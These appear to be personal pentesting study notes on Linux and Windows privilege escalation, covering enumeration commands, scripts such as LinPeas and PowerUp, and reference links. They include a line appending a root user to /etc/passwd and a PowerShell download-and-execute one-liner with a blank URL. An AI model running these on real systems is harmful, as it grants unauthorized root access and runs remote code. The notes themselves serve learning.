## Privilige Escalation

## Linux
### Exploits
- u usually have to compile kernel level exploits
- they are often in c
- have to get it on the target machine can be hard 
```shell
uname -a #print system information
```


### Linux Enumerate ways to escalate priviliges
- understand which linux kernel is running and search for privilege escalation exploits
- https://web.archive.org/web/20210308064709/blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
- https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/n/
- pspy: see processes that are running https://github.com/DominicBreuker/pspy
- 
```shell
sudo -l #shows rights or if user already

ps aux | grep root #check for processes running as root

/etc/passwd #check if you can write to it, than you can add you own password
#example
hacker:$1$Jx7ZfYxZ$wv6Z6zg1J7gZQ:0:0:root:/root:/bin/bash >> /etc/passwd # this creates that user

/etc/shadow #check if you can read it, than you can crack the passwords

#if user can execute a SUID binary
find / -perm -u=s -type f 2>/dev/null #find all SUID binaries (need to try if work like that)
# if there is a vulnerable binary you can exploit it

CRON jobs that runs as root


```

## Windows
- windows root is called system
- www.fuzzysecurity.com/tutorials/16.html
- https://book.hacktricks.xyz/windows/windows-local-privilege-escalation
- https://medium.com/bugbountywriteup/privilege-escalation-in-windows-380bee3a2842
### Exploits
- https://github.com/PowerShellMafia/PowerSploit
### Windows Enumerate ways to escalate priviliges
- powerup guide: https://www.harmj0y.net/blog/powershell/powerup-a-usage-guide/
- metasploit post modules (not all exploits work)
```shell
accesschk.exe /accepteula #check for service permissions
accesschk.exe -uwcqv "Authenticated Users" * #check for service permissions,

wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "c:\Windows\\" | findstr /i /v """     "
#check for services that are running as system

sc qc "VulnService" #check for service permissions 
# if you dont have permissions to stop the service you can try to  restart the machine hoply the service will start with system

#PowerUp:
powerUp.ps1 #script that checks for privilige escalations
# runs multiple checks
# Download it on target box
powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http:// '"
# than run it, it give the function that can be abused
# and it can add the user
```

### Privilige Escalation Scripts
- read the script
- understand the output
- try with them
#### Pros
- does the work for you
- can find a lot of information in a short time
- easy to download and run
- finds stored passwords
#### Cons
- Information overload
- can be a crutch
- may find false positives

#### Linux Scripts
```shell
LinPeas # Great script takes a while to run
LinEnum.sh # excellent script
unix-privesc-check # comes with kali / not so good?
linuxprivchecker.py # if there is python 
```
#### Windows Scripts
```shell
windows-privesc-check.exe # from pentestmonkey
PowerUp.ps1 # is on kali,  powershell script for multiple checks
winPeas # maybe anti virus deletes it
SharpSploit # a .Net Script
```